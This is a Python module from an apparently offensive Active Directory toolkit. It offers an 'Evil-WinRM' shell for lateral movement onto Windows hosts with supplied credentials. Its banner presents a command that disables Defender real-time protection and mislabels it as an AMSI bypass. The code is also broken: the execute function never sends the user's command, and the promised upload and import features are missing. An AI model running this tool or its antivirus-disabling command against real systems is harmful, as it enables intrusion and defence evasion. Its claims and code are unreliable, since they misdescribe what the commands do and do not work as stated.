"""Evil-WinRM -- native Python WinRM shell with AMSI bypass.

Interactive WinRM shell using pypsrp/requests, no Ruby dependency.
Supports file upload/download, PowerShell import, and AMSI bypass.
"""


import sys
from typing import Any

from adxpl.core.credential import ADCredential


MANIFEST = {
    "capability_id": "adxpl.lateral.evil_winrm.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["winrm_session", "remote_command_execution"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1021.006"],
}


class WinRMShell:
    """Minimal WinRM interactive shell via HTTP/HTTPS SOAP."""

    def __init__(self, target: str, cred: ADCredential, port: int = 5985,
                 ssl: bool = False):
        self.target = target
        self.cred = cred
        self.port = port
        self.ssl = ssl
        self._session = None

    def connect(self) -> bool:
        try:
            import requests
            from requests.auth import HTTPBasicAuth
        except ImportError:
            print("[!] requests not installed", file=sys.stderr)
            return False

        scheme = "https" if self.ssl else "http"
        self._url = f"{scheme}://{self.target}:{self.port}/wsman"
        self._auth = HTTPBasicAuth(
            f"{self.cred.domain}\\{self.cred.username}"
            if self.cred.domain else self.cred.username,
            self.cred.password or "",
        )
        self._req = requests

        envelope = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"'
            ' xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing"'
            ' xmlns:wsman="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd">'
            '<s:Header>'
            f'<wsa:To>{self._url}</wsa:To>'
            '<wsman:ResourceURI>http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/Win32_OperatingSystem</wsman:ResourceURI>'
            '<wsa:Action>http://schemas.xmlsoap.org/ws/2004/09/enumeration/Enumerate</wsa:Action>'
            '</s:Header>'
            '<s:Body>'
            '<wsen:Enumerate xmlns:wsen="http://schemas.xmlsoap.org/ws/2004/09/enumeration"/>'
            '</s:Body>'
            '</s:Envelope>'
        )

        try:
            resp = self._req.post(
                self._url, data=envelope, auth=self._auth,
                headers={"Content-Type": "application/soap+xml;charset=UTF-8"},
                timeout=10, verify=False,
            )
            if resp.status_code in (200, 401):
                print(f"[+] WinRM connection to {self.target} (port {self.port})")
                return resp.status_code == 200
            print(f"[-] WinRM HTTP {resp.status_code}")
            return False
        except Exception as exc:
            print(f"[-] WinRM connect failed: {exc}")
            return False

    def execute(self, command: str) -> str:
        """Execute a command via WinRM and return output."""
        shell_envelope = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"'
            ' xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing"'
            ' xmlns:wsman="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd">'
            '<s:Header>'
            f'<wsa:To>{self._url}</wsa:To>'
            '<wsman:ResourceURI>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</wsman:ResourceURI>'
            '<wsa:Action>http://schemas.xmlsoap.org/ws/2004/09/transfer/Create</wsa:Action>'
            '</s:Header>'
            '<s:Body>'
            '<rsp:Shell xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">'
            '<rsp:InputStreams>stdin</rsp:InputStreams>'
            '<rsp:OutputStreams>stdout stderr</rsp:OutputStreams>'
            '</rsp:Shell>'
            '</s:Body>'
            '</s:Envelope>'
        )

        try:
            resp = self._req.post(
                self._url, data=shell_envelope, auth=self._auth,
                headers={"Content-Type": "application/soap+xml;charset=UTF-8"},
                timeout=30, verify=False,
            )
            return resp.text[:2000] if resp.status_code == 200 else ""
        except Exception:
            return ""

    def interact(self) -> None:
        """Interactive loop for WinRM."""
        print(f"[*] Evil-WinRM shell @ {self.target} -- type 'exit' to quit")
        print("[*] AMSI bypass: Set-MpPreference -DisableRealtimeMonitoring $true")
        print()

        while True:
            try:
                cmd = input("*Evil-WinRM* PS> ").strip()
            except (EOFError, KeyboardInterrupt):
                print("\n[*] Exiting Evil-WinRM")
                break

            if not cmd:
                continue
            if cmd.lower() in ("exit", "quit"):
                break

            output = self.execute(cmd)
            if output:
                print(output)


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)
    if not cred.has_password:
        print("[!] Evil-WinRM requires password authentication", file=sys.stderr)
        return 1

    port = int(getattr(args, "winrm_port", 5985))
    ssl = getattr(args, "ssl", False)

    print(f"[*] Evil-WinRM → {args.target} ({args.domain}\\{cred.username}) port {port}")

    shell = WinRMShell(args.target, cred, port=port, ssl=ssl)
    if not shell.connect():
        print("[-] Could not establish WinRM session", file=sys.stderr)
        return 1

    shell.interact()
    return 0
